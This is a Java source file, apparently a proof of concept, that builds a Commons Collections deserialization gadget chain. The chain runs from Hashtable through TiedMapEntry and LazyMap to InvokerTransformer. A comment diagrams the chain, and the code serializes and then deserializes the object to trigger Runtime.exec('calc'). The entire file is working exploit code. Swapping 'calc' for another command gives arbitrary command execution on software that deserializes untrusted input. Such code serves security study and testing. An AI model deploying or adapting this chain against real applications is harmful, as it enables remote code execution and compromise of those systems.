package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
/*
	Gadget chain:
		ObjectInputStream.readObject()
		      java.util.Hashtable.readObject()
                    java.util.Hashtable.reconstitutionPut()
                            TiedMapEntry.hashCode();
                                    TiedMapEntry.getValue()
                                        LazyMap.get()
                                            ChainedTransformer.transform()
                                                ConstantTransformer.transform()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Class.getMethod()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Runtime.getRuntime()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Runtime.exec()
	Requires:
		commons-collections
 */

public class TiedMapEntry_hashCode {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        Map lazymap = LazyMap.decorate(new HashMap(), transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "123");
        Hashtable hashtable = new Hashtable();
        hashtable.put(tiedMapEntry,"123");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        lazymap.remove("123");

        SerializableTest.searilze(hashtable,"TiedMapEntry_equals.bin");
        SerializableTest.unzearilze("TiedMapEntry_equals.bin");
    }
}
